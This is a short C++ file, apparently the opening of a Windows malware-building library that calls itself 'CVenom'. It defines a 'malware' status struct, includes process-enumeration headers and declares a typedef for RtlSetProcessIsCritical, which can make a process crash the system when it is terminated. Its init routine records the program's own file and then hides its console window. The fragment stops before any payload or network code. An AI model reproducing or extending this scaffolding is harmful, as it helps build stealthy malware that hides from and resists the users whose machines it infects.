// Some Macros.
#define RAW 0
#define HEX 1
#define DEC 2
#define BIN 3
#define TCP 4
#define UDP 5

#define FUNCTION int x, int xx
#define KEEP_PID	0

#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NONSTDC_NO_DEPRECATE
#define WIN32_LEAN_AND_MEAN

// Headers To Include
#include <iostream>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <thread>

#include <winsock2.h>
#include <windows.h>
#include <psapi.h>
#include <Tlhelp32.h>
#include <Windows.h>
#pragma comment(lib, "shlwapi.lib")

// Accessing Some Functions From Different Namespaces.
using		std::string;
using       	std::remove;

// Custom Data Types And Typedefs

typedef void (*function)(int, int);

typedef long (WINAPI* RtlSetProcessIsCritical)(
			IN  BOOLEAN	bNew,
			OUT BOOLEAN*	pbOld,
			IN  BOOLEAN	bNeedScb);


struct c_malware_stat__t{
	char	name[256];

	size_t  size;
};

// Global Data For Some CVenom's Functionalities.
char**				_argv__;
int				_argc__;

struct c_malware_stat__t 	Current;
struct c_malware_stat__t*	MALWARE;

// Some Functions For Initializing The Library.
void cvinit(int argc, char** argv){
	HANDLE fh;
	HWND wh;

	_argv__=argv;
	_argc__=argc;
	MALWARE=&Current;

	fh=CreateFile(argv[0], GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	Current.size=GetFileSize(fh, NULL);

	strncpy(Current.name, argv[0], 256);

	CloseHandle(fh);

	AllocConsole();

	wh=FindWindow("ConsoleWindowClass", NULL);
	ShowWindow(wh, 0x00);

	return;
}

void cvexit(int x){
	exit(x);
}
